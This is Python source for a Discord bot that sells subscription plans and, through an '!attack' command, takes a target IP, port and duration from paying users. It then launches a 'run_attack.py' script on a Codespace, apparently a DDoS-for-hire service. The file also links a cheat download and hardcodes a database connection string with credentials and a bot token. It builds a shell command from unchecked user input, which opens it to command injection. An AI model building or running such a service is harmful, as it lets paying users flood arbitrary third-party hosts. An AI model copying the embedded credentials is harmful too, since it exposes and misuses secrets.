import discord
import logging
import asyncio
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
from discord.ext import commands
from discord.ui import Button, View

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# MongoDB setup
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

# Discord bot setup
TOKEN = 'IxbLk41S9j2NJMdLhZhUbVuVYGgEhA0O'
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Channel IDs
FORWARD_CHANNEL_ID = 796376799776997379  # Replace with your channel ID
ERROR_CHANNEL_ID = 796376799776997379   # Replace with your error channel ID

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []

async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"python3 run_attack.py {target_ip} {target_port} {duration}"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

@bot.command(name='approve')
@commands.has_permissions(administrator=True)
async def approve(ctx, user_id: int, plan: int = 0, days: int = 0):
    if plan == 1:  # Instant Plan 🧡
        if users_collection.count_documents({"plan": 1}) >= 99:
            await ctx.send("Approval failed: Instant Plan 🧡 limit reached (99 users).")
            return
    elif plan == 2:  # Instant++ Plan 💥
        if users_collection.count_documents({"plan": 2}) >= 499:
            await ctx.send("Approval failed: Instant++ Plan 💥 limit reached (499 users).")
            return

    valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
        upsert=True
    )
    msg_text = f"User {user_id} approved with plan {plan} for {days} days."
    await ctx.send(msg_text)
    channel = bot.get_channel(FORWARD_CHANNEL_ID)
    if channel:
        await channel.send(msg_text)

@bot.command(name='disapprove')
@commands.has_permissions(administrator=True)
async def disapprove(ctx, user_id: int):
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
        upsert=True
    )
    msg_text = f"User {user_id} disapproved and reverted to free."
    await ctx.send(msg_text)
    channel = bot.get_channel(FORWARD_CHANNEL_ID)
    if channel:
        await channel.send(msg_text)

@bot.command(name='attack')
async def attack(ctx):
    if not check_user_approval(ctx.author.id):
        await ctx.send("You are not approved.")
        return

    await ctx.send("Enter the target IP, port, and duration (in seconds) separated by spaces.")
    def check(message):
        return message.author == ctx.author and message.channel == ctx.channel

    try:
        message = await bot.wait_for('message', timeout=60.0, check=check)
        args = message.content.split()
        if len(args) != 3:
            await ctx.send("Invalid command format. Please use: target_ip target_port duration")
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            await ctx.send(f"Port {target_port} is blocked. Please use a different port.")
            return

        await run_attack_command_on_codespace(target_ip, target_port, duration)
        await ctx.send(f"Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds")
    except asyncio.TimeoutError:
        await ctx.send("You took too long to respond.")

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False

@bot.command(name='start')
async def start(ctx):
    # Create a view with buttons
    view = View()
    view.add_item(Button(label="Instant Plan 🧡", custom_id="instant_plan"))
    view.add_item(Button(label="Instant++ Plan 💥", custom_id="instant_plus"))
    view.add_item(Button(label="Canary Download✔️", custom_id="canary_download"))
    view.add_item(Button(label="My Account🏦", custom_id="my_account"))
    view.add_item(Button(label="Help❓", custom_id="help"))
    view.add_item(Button(label="Contact admin✔️", custom_id="contact_admin"))

    await ctx.send("Choose an option:", view=view)

@bot.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type == discord.InteractionType.component:
        custom_id = interaction.data['custom_id']
        if custom_id == 'instant_plan':
            await interaction.response.send_message("Instant Plan selected")
        elif custom_id == 'instant_plus':
            await interaction.response.send_message("Instant++ Plan selected")
            await attack(interaction.message.channel)
        elif custom_id == 'canary_download':
            await interaction.response.send_message("Please use the following link for Canary Download: https://t.me/HackingworldCheats/2990")
        elif custom_id == 'my_account':
            user_id = interaction.user.id
            user_data = users_collection.find_one({"user_id": user_id})
            if user_data:
                username = interaction.user.name
                plan = user_data.get('plan', 'N/A')
                valid_until = user_data.get('valid_until', 'N/A')
                current_time = datetime.now().isoformat()
                response = (f"**USERNAME:** {username}\n"
                            f"**Plan:** {plan}\n"
                            f"**Valid Until:** {valid_until}\n"
                            f"**Current Time:** {current_time}")
            else:
                response = "No account information found. Please contact the administrator."
            await interaction.response.send_message(response)
        elif custom_id == 'help':
            await interaction.response.send_message("Help selected")
        elif custom_id == 'contact_admin':
            await interaction.response.send_message("CONTACT ADMIN SELECTED DM TO CONTACT @DARKxZOMBSTER ")

@bot.event
async def on_ready():
    logging.info(f'Logged in as {bot.user.name}')

if __name__ == "__main__":
    bot.run(TOKEN)
